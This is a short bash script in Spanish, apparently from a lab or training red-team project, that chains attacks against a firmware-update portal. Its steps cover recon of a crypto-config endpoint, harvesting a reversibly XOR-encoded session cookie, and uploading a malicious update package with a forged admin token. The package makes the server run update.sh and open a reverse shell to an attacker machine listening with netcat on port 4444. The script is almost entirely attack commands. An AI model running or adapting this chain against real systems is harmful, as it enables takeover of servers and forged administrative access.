#!/bin/bash
# Payloads del proyecto - Portal de Gestion de Actualizaciones y Firmwares
# Reemplaza <IP_VICTIMA> e <IP_KALI>.
VICTIMA="http://<IP_VICTIMA>:8080"
KALI="<IP_KALI>"

# ===================== A04: Fallas Criptográficas =====================
# Recon: el endpoint filtra el esquema criptográfico
curl -s "$VICTIMA/api/config"

# Login usuario normal -> cookie con token XOR reversible
curl -si -X POST "$VICTIMA/login" \
     -d "usuario=operador&password=operador123" | grep -i set-cookie

# El descifrado XOR, la recuperación de la llave y la forja del token admin
# se automatizan en red-team/exploit_a04.py

# ===================== A08: Fallas de Integridad ======================
# 1. Listener en Kali:            nc -lvnp 4444
# 2. Construir paquete malicioso: python3 red-team/paquete_malicioso_red_team
# 3. Subir con el token admin forjado en el paso A04:
curl -s -X POST "$VICTIMA/upload-update" \
     -b "session=<TOKEN_ADMIN_FORJADO>" \
     -F "paquete=@out/malicious.tar"
# -> el servidor ejecuta update.sh y abre una reverse shell hacia $KALI:4444
